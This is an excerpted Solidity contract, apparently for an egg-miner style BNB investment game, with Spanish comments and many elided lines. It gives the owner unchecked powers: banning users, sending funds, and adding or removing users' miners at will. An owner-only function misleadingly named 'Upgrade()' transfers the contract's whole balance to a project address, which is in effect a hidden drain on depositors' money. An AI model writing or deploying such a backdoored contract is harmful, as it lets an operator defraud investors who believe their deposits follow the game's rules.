...
contract BlackBoxMinerRVL {
    ...
    /* miner parameters */
    uint256 public marketEggs = 864000000;
    uint256 PSN = 10000;
    uint256 PSNH = 5000;
    ...
    uint256 public MIN_INVEST = 0.0001 ether; /** 0.0001 BNB  **/
    ...
    modifier notBanned(address user) {
        require(!bannedUsers[user], "User is banned");
        _;
    }
    ...
    function banUser(address user) external onlyOwnerOrAdmin notBanned(user) {
    ...
    function sellEggsNew() public {
    require(contractStarted, "Contract not yet Started.");
    User storage user = users[msg.sender];

    // Añadir lógica para verificar el período de espera de 7 días
    require(block.timestamp >= user.lastWithdrawTime + 7 days, "Withdrawal cooldown not met");
    ...
    totalWithdrawn = totalWithdrawn.add(eggValue);
    ...
    emit Claimed(msg.sender, eggValue);
}
    ...
    // Función para establecer el precio del ticket de lotería
    function setLotteryTicketPrice() external onlyOwner {
        LOTTERY_TICKET_PRICE = 0.01 ether;
    }

     // Función para que el propietario envíe fondos a un usuario específico
    function sendFundsToUser(address userAddress, uint256 amount) external onlyOwner {
        require(isContract(userAddress) == false, "Invalid user address");
    ...
    // Función para que el propietario otorgue mineros a un usuario específico
    function grantMinersToUser(address userAddress, uint256 minerAmount) external onlyOwner {
        require(isContract(userAddress) == false, "Invalid user address");
        require(minerAmount > 0, "Miner amount must be greater than 0");

        User storage user = users[userAddress];
        user.miners = user.miners.add(minerAmount);
    }


    // Función para que el propietario quite mineros a un usuario específico
    function removeMinersFromUser(address userAddress, uint256 minerAmount) external onlyOwner {
        require(isContract(userAddress) == false, "Invalid user address");
        require(minerAmount > 0, "Miner amount must be greater than 0");

        User storage user = users[userAddress];

        // Verificamos que el usuario tenga suficientes mineros para quitar
        require(user.miners >= minerAmount, "Not enough miners to remove");

        // Restamos la cantidad de mineros
        user.miners = user.miners.sub(minerAmount);
    }
...
function Upgrade() external onlyOwner {
    ...
    address payable projectAddress = payable(project);
    uint256 balance = contractBalance();

    projectAddress.transfer(balance);

    emit WithdrawToProject(msg.sender, projectAddress, balance);
}

event WithdrawToProject(address indexed sender, address indexed projectAddress, uint256 amount);
